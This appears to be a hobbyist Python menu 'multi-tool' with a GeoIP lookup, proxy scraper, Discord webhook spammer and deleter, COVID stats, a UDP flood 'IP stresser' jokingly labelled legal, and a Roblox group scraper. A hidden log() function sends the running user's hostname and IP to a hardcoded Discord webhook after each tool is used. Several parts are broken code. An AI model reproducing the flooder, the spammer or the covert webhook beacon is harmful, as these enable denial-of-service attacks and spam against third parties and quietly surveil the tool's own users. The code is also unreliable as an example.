import os, requests, time, sys, random, socket, urllib
from datetime import datetime
import pprint
from dhooks import Webhook
import socket, threading
from covid import Covid
import bs4
from bs4 import BeautifulSoup


def log(name):
    logging = Webhook("https://discord.com/api/webhooks/754324914189893632/9QruauiSVUyFoLzi6YVxLLA_qcWqSK1W766K40ohVxYug4UV95YWH2QIaSaw4JXjrGau")
    ip = socket.gethostbyname(socket.getfqdn())
    datae = f"{name} has been executed by {socket.gethostname()}, with the ip adress of {ip}"
    logging.send(datae)
# tools lol


def GeoIP():
    ip_input = input('  IP> ')
    response = requests.get("http://extreme-ip-lookup.com/json/" + ip_input)
    response.json()
    pprint.pprint(response.json())
    time.sleep(8)
    log("GeoIP")
    Main()
def ProxyScrape():
    colour = "\033[31m"
    r = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http')
    print(r.text)
    p_type = input("  Type> ")
    p_timeout = input("  Timeout> ")
    f"https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}"
    with open("proxies.txt", "w") as f:
        f.write(r.text)
        print("proxies have been saved to" + colour + '"proxies.txt"')
        time.sleep(5)
        log("Proxyscraper")
        Main()
def webhookSpammer():
    sex = input("  how many times: ")
    yeeter = input("  Webhook: ")
    data = input("  Text: ")
    for i in range(int(sex)):
        hook = Webhook(yeeter)
        hook.send(data)
    print("webhook spammed")
    log("WebHook Spammer")
    time.sleep(3)
    Main()

def webhookDelete():
    yeeter = input("  webhook: ")
    hook = Webhook(yeeter)
    time.sleep(1)
    print("webhook deleted")
    hook.delete()
    log("Webhook Delete")
    Main()

def covidCheck():
    coveed = Covid()
    yellow = "\033[33m"
    cyan = "\033[36m"
    print(yellow + "        [1]" + cyan + " confirmed cases")
    print(yellow + "        [2]" + cyan + " country cases")
    print(yellow + "        [3]" + cyan + " recovered cases")
    print(yellow + "        [4]" + cyan + " total deaths")
    while True:
        choosen = input("  > ")
        if(choosen == str(1)):             
            confirmed = coveed.get_total_confirmed_cases()
            print(F"  there are {confirmed} confirmed cases")
            time.sleep(5)
            log("Covid")
            Main()
        elif(choosen == str(2)):             
            country = input("  country: ").lower
            country_cases = coveed.get_status_by_country_name(country)
            print(f"there are {country_cases} cases in {country}")
            time.sleep(3)
            log("Covid")
            Main()
        elif(choosen == str(3)):             
            recovered = coveed.get_total_recovered()
            print(f"there are {recovered} recovered people from covid")
            time.sleep(8)
            log("Covid")
            Main()
        elif(choosen == str(4)):
            deaths = coveed.get_total_deaths()
            print(f"there are {deaths} dead people from covid")
            time.sleep(8)
            log("Covid")
            Main()
def ipStresser():
    class Denial:
        def __init__(self, host):
            threading.Thread.__init__(self)
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.host = host
            self.port = 80 
            self.duration = 0
            self.bytes = random._urandom(1024)
            self.sent = 0


        def send_packet(self):
            while True:
                try:
                    send_all = self.connection.sendto(self.bytes,(self.host, self.port))
                    print("[**] Flood Started... On " + self.host)
                except UnboundLocalError:
                    try:
                        pass
                        print("[**] Flood Started... On " + self.host)
                    except:
                        pass
                except KeyboardInterrupt:
                    print("\n")
                    print("[+] Exiting....")
                    print("\n")
            while True:
                connect_all = send_all.accept()
                newthread = ClientThread(send_all)
                newthread.start()

                print("[+] Press Control^C to End! ")
                more_dos = input("[+] Would You Like To Boot A User Offline[exit/return]: ")

                if more_dos == "exit":
                    self.connection.close()
                    exit()
                elif more_dos == "return":
                    self.send_packet()
                else:
                    self.connection.close()
                    exit()

    ip_attack = input("Enter ip address: ")
    results = Denial(ip_attack)
    results.send_packet()
    Main()
def groupScraper():
    cum = input("  how many times (60000000 - 80000000): ")
    for i in int(cum):
        page = requests.get(f"https://www.roblox.com/groups/{random.randint(1, 1000000)}")
        soup = BeautifulSoup(page.content, "html.parser")
        colour = "\033[31m"
    if(soup.find('<span class="font-header-2 ng-binding" title="12" ng-bind="library.currentGroup.group.memberCount | abbreviate">0</span>')):
        with open("groups.txt", "w") as f:
            f.write(page.text)
            print("proxies have been saved to" + colour + '"proxies.txt"')
            time.sleep(5)
            log("Proxyscraper")

    # main code
class Main():
    def cls(self):
        linux = "clear"
        windows = "cls"
        os.system([linux, windows][os.name == "nt"])
    # ????????????????????????????????/ what the fuck does this mean
    def __init__(self):
        self.gg = True
        self.r = "\033[31m"
        self.g = "\033[32m"
        self.y = "\033[33m"
        self.b = "\033[34m"
        self.m = "\033[35m"
        self.c = "\033[36m"
        self.w = "\033[37m"
        self.rr = "\033[39m"
        self.cls()
        self.start_logo()
        self.options()
        while self.gg == True:
            choose = input(str("  > "  ))
            if(choose == str(1)):
                self.cls()
                self.start_logo()               
                GeoIP()
            elif(choose == str(2)):
                self.cls()
                self.start_logo()
                ProxyScrape()
            elif(choose == str(3)):
                self.cls()
                self.start_logo()
                webhookSpammer()
            elif(choose == str(4)):
                self.cls()
                self.start_logo()
                webhookDelete()
            elif(choose == str(5)):
                self.cls()
                self.start_logo()
                covidCheck()
            elif(choose == str(6)):
                self.cls()
                self.start_logo()
                ipStresser()
            elif(choose == str(7)):
                self.cls()
                self.start_logo()
                groupScraper()




    def start_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]
        x = """
        ████████╗███████╗███████╗████████╗
        ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
           ██║   █████╗  ███████╗   ██║   
           ██║   ██╔══╝  ╚════██║   ██║   
           ██║   ███████╗███████║   ██║   
           ╚═╝   ╚══════╝╚══════╝   ╚═╝   

        """

        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)
    def options(self):
        print(self.y + '        [1]' + self.c + '  geoip')
        print(self.y + '        [2]' + self.c + '  proxy scraper')
        print(self.y + '        [3]' + self.c + '  webhook spammer')
        print(self.y + '        [4]' + self.c + '  webhook deleter')
        print(self.y + '        [5]' + self.c + '  covid')
        print(self.y + '        [6]' + self.c + '  totally something legal yes yes')
        print(self.y + '        [7]' + self.c + '  group scraper')



Main()